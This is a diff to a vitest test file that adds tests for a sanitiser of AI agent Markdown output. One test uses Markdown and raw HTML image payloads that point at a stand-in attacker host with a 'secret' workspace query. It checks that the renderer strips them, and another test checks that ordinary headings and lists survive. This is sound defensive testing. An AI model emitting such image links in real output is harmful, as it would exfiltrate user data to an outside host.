@@ -3,7 +3,7 @@
  */
 import { marked } from 'marked';
 import { afterEach, describe, expect, it, vi } from 'vitest';
-import { renderMarkdownPreview } from '../markdown';
+import { renderAgentMarkdown, renderMarkdownPreview } from '../markdown';
 
 afterEach(() => {
   vi.restoreAllMocks();
@@ -36,5 +36,29 @@ describe('renderMarkdownPreview', () => {
       throw new Error('parse failed');
     });
     expect(renderMarkdownPreview('anything')).toBe('');
+  });
+});
+
+describe('renderAgentMarkdown', () => {
+  it('removes Markdown and raw HTML images from persisted agent output', () => {
+    const html = renderAgentMarkdown(
+      [
+        '![audit](https://attacker.invalid/collect?workspace=secret)',
+        '<img src="https://attacker.invalid/raw" alt="raw">',
+      ].join('\n'),
+    );
+
+    expect(html).not.toContain('<img');
+    expect(html).not.toContain('src=');
+    expect(html).not.toContain('attacker.invalid');
+  });
+
+  it('preserves ordinary headings, text, and lists', () => {
+    const html = renderAgentMarkdown('# Plan\n\n- inspect\n- verify');
+
+    expect(html).toContain('<h1>Plan</h1>');
+    expect(html).toContain('<ul>');
+    expect(html).toContain('<li>inspect</li>');
+    expect(html).toContain('<li>verify</li>');
   });
 });
